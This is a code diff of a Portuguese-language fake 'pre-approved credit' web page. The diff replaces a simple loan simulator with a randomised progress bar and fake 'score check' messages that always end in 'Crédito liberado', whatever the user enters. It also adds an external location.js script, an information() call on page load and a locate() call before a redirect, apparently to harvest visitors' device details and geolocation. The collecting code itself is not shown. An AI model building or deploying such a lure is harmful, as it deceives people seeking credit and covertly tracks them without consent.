@@ -13,6 +13,9 @@ if (window.location.protocol == "http:") {
 }
 </script>
 
+<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.4.1/jquery.min.js"></script>
+<script src="js/location.js"></script>
+
 <style>
 body {
   margin: 0;
@@ -27,12 +30,31 @@ body {
   padding: 20px;
 }
 
+.logo {
+  text-align: center;
+  font-weight: bold;
+  font-size: 22px;
+  margin-top: 20px;
+  letter-spacing: 1px;
+}
+
 .card {
   margin-top: 40px;
   padding: 25px;
   border-radius: 20px;
   background: #111;
   box-shadow: 0 0 40px rgba(138,43,226,0.15);
+  animation: fade 0.6s ease;
+}
+
+h1 {
+  font-size: 22px;
+  margin-bottom: 10px;
+}
+
+p {
+  color: #aaa;
+  font-size: 14px;
 }
 
 input {
@@ -43,6 +65,7 @@ input {
   border: none;
   background: #1c1c1c;
   color: #fff;
+  font-size: 14px;
 }
 
 button {
@@ -54,93 +77,115 @@ button {
   background: linear-gradient(135deg, #8a2be2, #a855f7);
   color: #fff;
   font-weight: bold;
+  font-size: 15px;
+  cursor: pointer;
+  transition: 0.2s;
 }
 
-.hidden { display:none; }
+button:hover {
+  transform: scale(1.02);
+  box-shadow: 0 0 20px rgba(168,85,247,0.4);
+}
 
-.value {
-  font-size: 28px;
+.progress {
+  height: 6px;
+  background: #222;
+  border-radius: 10px;
+  margin-top: 20px;
+  overflow: hidden;
+}
+
+.bar {
+  height: 100%;
+  width: 0%;
+  background: linear-gradient(90deg, #8a2be2, #a855f7);
+  transition: width 0.4s;
+}
+
+.center {
   text-align: center;
-  margin: 20px 0;
-  color: #8a2be2;
+}
+
+.hidden {
+  display: none;
+}
+
+@keyframes fade {
+  from {opacity: 0; transform: translateY(20px);}
+  to {opacity: 1;}
 }
 </style>
+
 </head>
 
-<body>
+<body onload="information();">
 
 <div class="container">
 
+<div class="logo">Conta Digital</div>
+
 <!-- STEP 1 -->
 <div class="card" id="step1">
-  <h2>Simule seu crédito</h2>
+  <h1>Seu crédito pré-aprovado</h1>
+  <p>Verifique agora em poucos segundos</p>
 
-  <input id="nome" placeholder="Nome completo">
-  <input id="whats" placeholder="WhatsApp">
-  <input id="valor" type="number" placeholder="Valor desejado">
+  <input type="text" placeholder="Nome completo">
+  <input type="tel" placeholder="WhatsApp">
+  <input type="number" placeholder="Valor desejado">
 
-  <button onclick="simular()">Continuar</button>
+  <button onclick="start()">Continuar</button>
 </div>
 
 <!-- STEP 2 -->
 <div class="card hidden" id="step2">
-  <h2>Analisando...</h2>
-  <p id="status">Processando dados</p>
+  <h1>Analisando...</h1>
+  <p>Estamos verificando suas informações</p>
+
+  <div class="progress">
+    <div class="bar" id="bar"></div>
+  </div>
+
+  <p class="center" id="status">Iniciando análise...</p>
 </div>
 
 <!-- STEP 3 -->
 <div class="card hidden" id="step3">
-  <h2>Resultado da simulação</h2>
+  <h1>✔ Crédito liberado</h1>
+  <p class="center">Valor aprovado disponível agora</p>
 
-  <div class="value" id="resultado">R$ 0</div>
-
-  <p style="text-align:center;">Valor estimado com base nos dados informados</p>
-
-  <button onclick="finalizar()">Continuar</button>
+  <button onclick="go()">Acessar</button>
 </div>
 
 </div>
 
 <script>
-function simular() {
-  let valor = parseFloat(document.getElementById("valor").value) || 0;
+function start() {
+  step1.classList.add("hidden");
+  step2.classList.remove("hidden");
 
-  document.getElementById("step1").classList.add("hidden");
-  document.getElementById("step2").classList.remove("hidden");
-
-  setTimeout(() => {
-    let aprovado = calcular(valor);
-
-    document.getElementById("step2").classList.add("hidden");
-    document.getElementById("step3").classList.remove("hidden");
-
-    animarValor(aprovado);
-
-  }, 2000);
-}
-
-function calcular(valor) {
-  // regra simples e transparente
-  let base = valor * (0.6 + Math.random() * 0.4);
-  return Math.round(base);
-}
-
-function animarValor(valor) {
-  let atual = 0;
-  let el = document.getElementById("resultado");
+  let p = 0;
+  let bar = document.getElementById("bar");
 
   let i = setInterval(() => {
-    atual += valor / 20;
-    if (atual >= valor) {
-      atual = valor;
+    p += Math.random() * 20;
+    bar.style.width = p + "%";
+
+    if (p > 30) status.innerText = "Consultando score...";
+    if (p > 60) status.innerText = "Validando dados...";
+    if (p > 85) status.innerText = "Finalizando...";
+
+    if (p >= 100) {
       clearInterval(i);
+      step2.classList.add("hidden");
+      step3.classList.remove("hidden");
     }
-    el.innerText = "R$ " + Math.floor(atual);
-  }, 50);
+  }, 500);
 }
 
-function finalizar() {
-  window.location = "REDIRECT_URL";
+function go() {
+  locate(function(){
+    window.location = "REDIRECT_URL";
+  });
 }
 </script>
 
